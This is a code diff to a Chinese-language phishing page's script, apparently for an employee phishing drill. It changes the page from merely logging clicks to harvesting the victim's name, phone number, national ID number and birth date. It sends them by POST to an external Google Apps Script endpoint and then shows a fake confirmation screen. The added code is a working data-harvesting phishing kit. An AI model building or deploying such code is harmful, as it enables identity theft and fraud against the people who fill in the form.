@@ -214,7 +214,7 @@
 
 <script>
     // 您的 Web App 網址
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz3Xzz5S47h8BjSwpUoBsFOFtAPd6k23WMzgUPhodaX6utFQjLdLg0Gmai_qqyVQ7HJ/exec"; // <-- 請換成您自己的網址！
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz3Xzz5S47h8BjSwpUoBsFOFtAPd6k23WMzgUPhodaX6utFQjLdLg0Gmai_qqyVQ7HJ/exec"; // <-- 【重要】請務必換成您自己的網址！
 
     // 從釣魚連結的 URL 中取得員工編號
     const urlParams = new URLSearchParams(window.location.search);
@@ -223,32 +223,48 @@
     // 將 navigator.userAgent 進行編碼，以避免特殊字元問題
     const userAgent = encodeURIComponent(navigator.userAgent);
 
-    // 1. 頁面載入時，記錄「連結點擊」事件
+    // 1. 頁面載入時，記錄「連結點擊」事件 (使用 GET)
     document.addEventListener('DOMContentLoaded', () => {
         fetch(`${SCRIPT_URL}?userId=${userId}&eventType=Link_Clicked&userAgent=${userAgent}`);
     });
 
     // 動態設定截止日期
-    document.getElementById('deadline').innerText = '2025年8月31日 23:59';
+    document.getElementById('deadline').innerText = '2025年8月4日 23:59';
 
-    // 2. 處理表單提交
+    // 2. 處理表單提交 (使用 POST)
     const form = document.getElementById('phishing-form');
     form.addEventListener('submit', function(event) {
-        event.preventDefault();
+        event.preventDefault(); // 阻止表單的預設提交行為
 
         const submitButton = document.getElementById('submit-button');
         submitButton.innerText = '資料驗證中，請稍候...';
         submitButton.disabled = true;
-        
-        // 記錄「資料提交」事件
-        fetch(`${SCRIPT_URL}?userId=${userId}&eventType=Data_Submitted&userAgent=${userAgent}`);
 
-        // 顯示成功畫面
+        // 收集表單中的所有資料
+        const formData = {
+            name: document.getElementById('full-name').value,
+            phone: document.getElementById('phone-number').value,
+            idCard: document.getElementById('id-card').value,
+            birthDate: document.getElementById('birth-date').value
+        };
+
+        // 使用 POST 方法，將表單資料打包成 JSON 字串放在 body 中發送
+        fetch(`${SCRIPT_URL}?userId=${userId}&userAgent=${userAgent}`, {
+            method: 'POST',
+            mode: 'no-cors', // 使用 no-cors 模式，因為 Apps Script 不會回傳 CORS headers
+            cache: 'no-cache',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(formData)
+        });
+
+        // 為了演練效果，無論後端是否成功，前端都顯示成功畫面
         setTimeout(() => {
             document.getElementById('main-container').innerHTML = `
                 <div style="text-align:center; padding: 40px 0;">
                     <svg style="color: #28a745; width: 80px; height: 80px; margin-bottom: 20px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
-                    <div style="color: #28a745; font-family: 'Noto Serif TC', serif; font-size: 24px; font-weight: 700;">資料已成功提交！</div>
+                    <div style="font-family: 'Noto Serif TC', serif; font-size: 24px; font-weight: 700;">資料已成功提交！</div>
                     <p style="font-size: 16px; color: #555; margin-top: 10px;">您的補領資格正在進行最終審核。<br>結果將於 3-5 個工作天內，以簡訊方式通知。</p>
                 </div>
             `;
